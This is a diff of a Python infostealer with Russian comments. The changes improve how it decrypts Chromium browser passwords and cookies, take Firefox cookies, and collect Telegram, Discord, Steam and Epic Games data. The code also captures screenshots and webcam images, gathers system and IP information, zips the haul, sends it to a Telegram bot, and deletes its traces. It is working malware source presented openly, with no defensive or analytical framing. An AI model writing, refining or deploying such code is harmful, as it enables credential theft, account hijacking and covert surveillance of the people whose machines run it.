@@ -334,6 +334,13 @@ def get_encryption_key(browser_path):
         encrypted_key = encrypted_key[5:]
         try:
             return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        except AttributeError:
+            # Исправление для ошибки с отсутствующим атрибутом
+            if hasattr(win32crypt, 'CryptUnprotectData'):
+                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            else:
+                print("Ошибка: win32crypt не имеет атрибута CryptUnprotectData")
+                return None
         except Exception as e:
             print(f"Ошибка в win32crypt.CryptUnprotectData: {e}")
             return None
@@ -344,7 +351,14 @@ def get_encryption_key(browser_path):
 def decrypt_password(password, key):
     """Расшифровывает пароль"""
     if not key:
+        # Попробуем расшифровать только с помощью DPAPI
+        if platform.system() == "Windows":
+            try:
+                return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8')
+            except:
+                return ""
         return ""
+    
     try:
         if isinstance(password, bytes) and len(password) > 15:
             iv = password[3:15]
@@ -355,13 +369,16 @@ def decrypt_password(password, key):
                 return decrypted_pass
             except:
                 pass
+        
+        # Для старых версий (DPAPI) - только Windows
         if platform.system() == "Windows":
             try:
-                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+                return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8')
             except:
                 return ""
     except:
         pass
+    
     return ""
 
 def steal_chrome_passwords(browser_name, profile_path):
@@ -369,9 +386,11 @@ def steal_chrome_passwords(browser_name, profile_path):
     try:
         key = get_encryption_key(str(Path(profile_path).parent))
         login_db = Path(profile_path) / "Login Data"
+        
         if not login_db.exists():
             return []
         
+        # Создаем временную копию файла паролей
         temp_db = Path(tempfile.gettempdir()) / f"temp_pass_{browser_name}_{random.randint(1000,9999)}.db"
         shutil.copy2(str(login_db), str(temp_db))
         
@@ -393,20 +412,22 @@ def steal_chrome_passwords(browser_name, profile_path):
                 continue
         
         conn.close()
-        temp_db.unlink()
+        temp_db.unlink()  # Удаляем временный файл
         return passwords
     except Exception as e:
         print(f"Ошибка при краже паролей {browser_name}: {e}")
         return []
 
 def steal_chromium_cookies(browser_name, profile_path):
-    """Крадет куки с поддержкой vXX префиксов"""
+    """Крадет куки из браузеров на основе Chromium (с улучшенной дешифровкой)"""
     try:
         key = get_encryption_key(str(Path(profile_path).parent))
         cookie_db = Path(profile_path) / "Network" / "Cookies"
+        
         if not cookie_db.exists():
             return []
         
+        # Создаем временную копию файла куки
         temp_db = Path(tempfile.gettempdir()) / f"temp_cookie_{browser_name}_{random.randint(1000,9999)}.db"
         shutil.copy2(str(cookie_db), str(temp_db))
         
@@ -420,31 +441,35 @@ def steal_chromium_cookies(browser_name, profile_path):
                 host, name, plain_value, path, expires, secure, encrypted_value = item
                 decrypted_value = ""
                 
-                if encrypted_value and isinstance(encrypted_value, bytes) and len(encrypted_value) >= 15:
-                    # Обработка vXX префикса
-                    if encrypted_value[0:1] == b'v' and encrypted_value[1:3].isdigit():
+                if encrypted_value and isinstance(encrypted_value, bytes) and len(encrypted_value) > 3:
+                    # Проверяем наличие префикса v10/v11
+                    if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                         iv = encrypted_value[3:15]
                         ciphertext = encrypted_value[15:]
+                        cipher = AES.new(key, AES.MODE_GCM, iv)
+                        
                         try:
-                            cipher = AES.new(key, AES.MODE_GCM, iv)
                             decrypted_value = cipher.decrypt(ciphertext)[:-16].decode('utf-8')
-                        except Exception as e:
-                            print(f"Ошибка дешифровки куки (AES-GCM): {e}")
+                        except:
+                            try:
+                                decrypted_value = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:]).decode('utf-8')
+                            except:
+                                decrypted_value = ""
                     else:
-                        # Старые версии (DPAPI)
+                        # Для старых версий (DPAPI)
                         if platform.system() == "Windows":
                             try:
                                 decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
-                            except Exception as e:
-                                print(f"Ошибка дешифровки куки (DPAPI): {e}")
-                
-                if not decrypted_value and plain_value:
+                            except:
+                                decrypted_value = ""
+                elif plain_value:
+                    # Используем обычное значение, если оно есть
                     decrypted_value = plain_value
                 
                 cookies.append({
                     'host': host,
                     'name': name,
-                    'value': decrypted_value or "",
+                    'value': decrypted_value or "",  # Гарантированно не пустое
                     'path': path,
                     'expires': expires,
                     'secure': bool(secure)
@@ -454,7 +479,7 @@ def steal_chromium_cookies(browser_name, profile_path):
                 continue
         
         conn.close()
-        temp_db.unlink()
+        temp_db.unlink()  # Удаляем временный файл
         return cookies
     except Exception as e:
         print(f"Ошибка при краже куки {browser_name}: {e}")
@@ -463,10 +488,13 @@ def steal_chromium_cookies(browser_name, profile_path):
 def steal_passwords():
     """Крадет пароли из всех доступных браузеров"""
     try:
+        # Гарантируем существование папки
         if not PASSWORDS_DIR.exists():
             PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
+        
         print(f"[Кража паролей] Папка для сохранения: {PASSWORDS_DIR}")
         
+        # Пути к профилям браузеров
         appdata = BROWSER_DATA_DIR
         roaming = Path(os.getenv("APPDATA") or "")
         
@@ -481,8 +509,10 @@ def steal_passwords():
         for browser_name, display_name in BROWSERS.items():
             try:
                 passwords = []
+                
                 if browser_name == "firefox":
-                    pass  # Firefox пока не поддерживается
+                    # Для Firefox оставим заглушку
+                    print(f"Для браузера {display_name} пароли не поддерживаются")
                 elif browser_name in browser_paths:
                     path = browser_paths[browser_name]
                     if path.exists():
@@ -492,14 +522,15 @@ def steal_passwords():
                             time.sleep(1)
                         passwords = steal_chrome_passwords(browser_name, str(path))
                 
-                # Сохраняем пароли только если они есть
+                # Сохраняем пароли в other/passwords
                 if passwords:
                     password_file = PASSWORDS_DIR / f"{display_name}_Passwords.json"
                     with open(password_file, 'w', encoding='utf-8') as f:
                         json.dump(passwords, f, indent=4, ensure_ascii=False)
-                        print(f"✅ Пароли {display_name} сохранены: {password_file}")
+                        print(f"Пароли {display_name} сохранены: {password_file}")
                 else:
-                    print(f"⚠️ Для браузера {display_name} пароли не найдены")
+                    print(f"Для браузера {display_name} пароли не найдены")
+                        
             except Exception as e:
                 print(f"Общая ошибка при краже паролей {browser_name}: {e}")
     except Exception as e:
@@ -508,10 +539,13 @@ def steal_passwords():
 def steal_cookies():
     """Крадет куки из всех доступных браузеров"""
     try:
+        # Гарантируем существование папки
         if not COOKIE_DIR.exists():
             COOKIE_DIR.mkdir(parents=True, exist_ok=True)
+        
         print(f"[Кража cookies] Папка для сохранения: {COOKIE_DIR}")
         
+        # Пути к профилям браузеров
         appdata = BROWSER_DATA_DIR
         roaming = Path(os.getenv("APPDATA") or "")
         
@@ -526,7 +560,9 @@ def steal_cookies():
         for browser_name, display_name in BROWSERS.items():
             try:
                 cookies = []
+                
                 if browser_name == "firefox":
+                    # Для Firefox используем browser_cookie3
                     try:
                         jar = browser_cookie3.firefox()
                         for cookie in jar:
@@ -538,8 +574,9 @@ def steal_cookies():
                                 'expires': cookie.expires,
                                 'secure': cookie.secure
                             })
-                    except:
-                        print(f"⚠️ Не удалось получить куки для Firefox")
+                        print(f"Куки Firefox успешно получены")
+                    except Exception as e:
+                        print(f"Не удалось получить куки для Firefox: {e}")
                 elif browser_name in browser_paths:
                     path = browser_paths[browser_name]
                     if path.exists():
@@ -549,14 +586,15 @@ def steal_cookies():
                             time.sleep(1)
                         cookies = steal_chromium_cookies(browser_name, str(path))
                 
-                # Сохраняем куки только если они есть
+                # Сохраняем куки в other/cookies
                 if cookies:
                     cookie_file = COOKIE_DIR / f"{display_name}_Cookies.json"
                     with open(cookie_file, 'w', encoding='utf-8') as f:
                         json.dump(cookies, f, indent=4, ensure_ascii=False)
-                        print(f"✅ Куки {display_name} сохранены: {cookie_file}")
+                        print(f"Куки {display_name} сохранены: {cookie_file}")
                 else:
-                    print(f"⚠️ Для браузера {display_name} куки не найдены")
+                    print(f"Для браузера {display_name} куки не найдены")
+                        
             except Exception as e:
                 print(f"Общая ошибка при краже куки {browser_name}: {e}")
     except Exception as e:
@@ -573,6 +611,8 @@ def get_ipinfo():
 def get_system_info():
     """Собирает полную системную информацию"""
     ipinfo = get_ipinfo()
+    
+    # Получаем информацию о CPU
     cpu_info = {
         "model": get_cpu_name(),
         "physical_cores": psutil.cpu_count(logical=False),
@@ -581,6 +621,7 @@ def get_system_info():
         "usage": psutil.cpu_percent(interval=1)
     }
     
+    # Получаем информацию о дисках
     drives = []
     for part in psutil.disk_partitions():
         try:
@@ -597,6 +638,7 @@ def get_system_info():
         except:
             continue
     
+    # Получаем сетевую информацию
     network_info = {
         "public_ip": ipinfo.get("ip", "N/A"),
         "isp": ipinfo.get("org", "N/A"),
@@ -640,19 +682,24 @@ def take_screenshot():
         return False
 
 def create_zip():
-    """Создает ZIP-архив с данными"""
+    """Создает ZIP-архив с данными, гарантируя включение всех папок"""
     zip_name = f"system_data_{random.randint(1000,9999)}.zip"
     zip_path = Path(tempfile.gettempdir()) / zip_name
     
     try:
         with zipfile.ZipFile(str(zip_path), 'w', zipfile.ZIP_DEFLATED) as zipf:
-            # Собираем все файлы в папке BASE_DIR
+            # Собираем все файлы и папки
+            all_files = []
             for root, _, files in os.walk(str(BASE_DIR)):
                 for file in files:
                     file_path = Path(root) / file
-                    arcname = file_path.relative_to(BASE_DIR)
-                    zipf.write(str(file_path), str(arcname))
+                    all_files.append(file_path)
             
+            # Добавляем все файлы в архив
+            for file_path in all_files:
+                arcname = file_path.relative_to(BASE_DIR)
+                zipf.write(str(file_path), str(arcname))
+                
             # Гарантируем включение пустых папок
             empty_folders = [
                 OTHER_DIR,
@@ -674,63 +721,76 @@ def create_zip():
                         zipf.write(str(marker_file), str(arcname))
                     except Exception as e:
                         print(f"Не удалось создать маркер для {folder}: {e}")
+            
         return zip_path
     except Exception as e:
         print(f"Ошибка создания архива: {e}")
         return None
 
 def send_to_telegram(zip_path):
-    """Отправляет данные в Telegram"""
+    """Отправляет данные в Telegram в правильной последовательности"""
     try:
+        # 1. Отправляем скриншот (если есть)
         if SCREENSHOT_PATH.exists():
             with open(str(SCREENSHOT_PATH), 'rb') as photo:
                 bot.send_photo(
                     chat_id=TELEGRAM_CHAT_ID,
                     photo=photo,
-                    caption="🖥️ Скриншот рабочего стола"
+                    caption="Скриншот рабочего стола"
                 )
             time.sleep(1)
+
+        # 2. Отправляем снимок с веб-камеры (если есть)
         if WEBCAM_PATH.exists():
             with open(str(WEBCAM_PATH), 'rb') as photo:
                 bot.send_photo(
                     chat_id=TELEGRAM_CHAT_ID,
                     photo=photo,
-                    caption="📸 Снимок с веб-камеры"
+                    caption="Снимок с веб-камеры"
                 )
             time.sleep(1)
+
+        # 3. Отправляем краткие сведения о системе
         sys_info = get_system_info()
         cpu_name = get_cpu_name()
         cpu_cores = f"{psutil.cpu_count(logical=False)}/{psutil.cpu_count(logical=True)} (физич./логич.)"
         cpu_usage = f"{psutil.cpu_percent(interval=1)}%"
+        
         summary = (
-            "🚨 *СИСТЕМНЫЙ ОТЧЕТ* 🚨\n"
-            f"• *ОС:* `{sys_info['system']['os']} {sys_info['system']['version']}`\n"
-            f"• *Пользователь:* `{sys_info['system']['username']}`\n"
-            f"• *Процессор:* `{cpu_name}`\n"
-            f"• *Ядра:* `{cpu_cores}`\n"
-            f"• *Нагрузка:* `{cpu_usage}`\n"
-            f"• *ОЗУ:* `{sys_info['hardware']['memory']['total_gb']} GB`\n"
-            f"• *IP:* `{sys_info['network']['public_ip']}`\n"
-            f"• *Местоположение:* `{sys_info['network']['location']}`"
+            "СИСТЕМНЫЙ ОТЧЕТ\n"
+            f"• ОС: {sys_info['system']['os']} {sys_info['system']['version']}\n"
+            f"• Пользователь: {sys_info['system']['username']}\n"
+            f"• Процессор: {cpu_name}\n"
+            f"• Ядра: {cpu_cores}\n"
+            f"• Нагрузка: {cpu_usage}\n"
+            f"• ОЗУ: {sys_info['hardware']['memory']['total_gb']} GB\n"
+            f"• IP: {sys_info['network']['public_ip']}\n"
+            f"• Местоположение: {sys_info['network']['location']}"
         )
-        bot.send_message(TELEGRAM_CHAT_ID, summary, parse_mode='Markdown')
+        bot.send_message(TELEGRAM_CHAT_ID, summary)
         time.sleep(1)
+
+        # 4. Проверяем размер архива перед отправкой
         if not zip_path or not zip_path.exists():
-            bot.send_message(TELEGRAM_CHAT_ID, "❌ Ошибка: архив не создан")
+            bot.send_message(TELEGRAM_CHAT_ID, "Ошибка: архив не создан")
             return False
-        zip_size = zip_path.stat().st_size / (1024 * 1024)
+        
+        zip_size = zip_path.stat().st_size / (1024 * 1024)  # Размер в МБ
+        
         if zip_size > 50:
             bot.send_message(
                 TELEGRAM_CHAT_ID,
-                f"❌ Размер архива превышает 50 МБ ({zip_size:.2f} МБ). "
+                f"Размер архива превышает 50 МБ ({zip_size:.2f} МБ). "
                 "Данные не будут отправлены."
             )
             return False
+
+        # 5. Отправляем архив с данными
         with open(str(zip_path), 'rb') as f:
             bot.send_document(
                 chat_id=TELEGRAM_CHAT_ID,
                 document=f,
-                caption="📦 Полные данные системы, куки, пароли и данные приложений",
+                caption="Полные данные системы, куки, пароли и данные приложений",
                 timeout=120
             )
         return True
@@ -741,10 +801,15 @@ def send_to_telegram(zip_path):
 def cleanup():
     """Очищает следы"""
     try:
+        # Удаляем основную папку с данными
         if BASE_DIR.exists():
             shutil.rmtree(str(BASE_DIR), ignore_errors=True)
+        
+        # Удаляем lock-файл
         if LOCK_FILE.exists():
             LOCK_FILE.unlink()
+            
+        # Удаляем временные файлы
         for file in Path(tempfile.gettempdir()).iterdir():
             if file.name.startswith("temp_") and file.name.endswith(".db"):
                 try:
@@ -756,44 +821,57 @@ def cleanup():
 
 def main_workflow():
     """Основной рабочий процесс"""
+    # Гарантированное создание папок
     create_directories()
+    
+    # Собираем системную информацию
     sys_info = get_system_info()
     with open(BASE_DIR / "system_report.json", 'w', encoding='utf-8') as f:
         json.dump(sys_info, f, indent=4, ensure_ascii=False)
     
-    # Крадем данные
+    # Крадем куки
     steal_cookies()
+    
+    # Крадем пароли
     steal_passwords()
+    
+    # Крадем данные приложений
     steal_telegram_data()
     steal_discord_data()
     steal_steam_data()
     steal_epic_games_data()
     
-    # Создаем скриншоты
+    # Скриншот
     take_screenshot()
+    
+    # Снимок с веб-камеры
     capture_webcam()
     
     # Упаковываем и отправляем
     zip_file = create_zip()
+    
     if zip_file:
         send_to_telegram(zip_file)
 
 
 if __name__ == "__main__":
+    # Проверка блокировки
     if LOCK_FILE.exists():
         sys.exit()
+    
     try:
         with open(str(LOCK_FILE), 'w') as f:
             f.write(str(os.getpid()))
     except:
         sys.exit()
+    
     try:
         main_workflow()
         print("[+] Готово")
     except Exception as e:
         print(f"!!! Критическая ошибка: {e}")
         try:
-            bot.send_message(TELEGRAM_CHAT_ID, f"❌ Критическая ошибка: {str(e)}")
+            bot.send_message(TELEGRAM_CHAT_ID, f"Критическая ошибка: {str(e)}")
         except:
             pass
     finally:
